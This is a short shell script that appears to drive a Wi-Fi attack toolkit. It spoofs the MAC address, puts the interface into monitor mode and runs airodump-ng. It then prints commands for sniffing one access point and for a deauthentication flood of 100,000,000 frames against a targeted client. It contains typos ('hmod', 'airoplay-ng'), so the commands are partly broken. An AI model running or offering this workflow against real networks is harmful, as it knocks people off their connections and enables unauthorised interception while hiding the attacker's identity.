nic="$1"

#chmod +x all.sh
#chmod +x netmgr.sh
#chmod +x if_monitor_mode.sh
#chmod +x mac_ad_ch.sh
#hmod +x targetted_packet_sniffing.sh
#chmod +x deauth_from_net.sh

./netmgr.sh
./macad_anonymous.sh
./if_monitor_mode.sh
airodump-ng "$nic"

echo targetted_packet_sniffing.sh
echo airodump-ng --bssid \$AP_macad --channel \$channel \$nic
echo 
echo deauth_from_net.sh
echo airoplay-ng --deauth 100000000 -a \$AP_macad -c \$client_macad \$nic

